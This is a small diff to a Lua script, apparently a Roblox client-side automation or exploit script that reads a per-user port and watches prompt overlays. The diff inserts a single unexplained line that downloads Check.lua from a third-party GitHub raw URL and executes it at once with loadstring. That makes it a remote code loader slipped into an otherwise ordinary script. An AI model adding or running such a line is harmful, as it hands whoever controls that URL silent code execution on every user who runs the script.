@@ -63,6 +63,7 @@ end
 
 Port = Get_port(username) or 5000
 print(Port)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/NopNopA/Loader/refs/heads/main/Check.lua"))()
 
 local function checkForError()
     game:GetService("CoreGui").RobloxPromptGui.promptOverlay.ChildAdded:Connect(function(child)
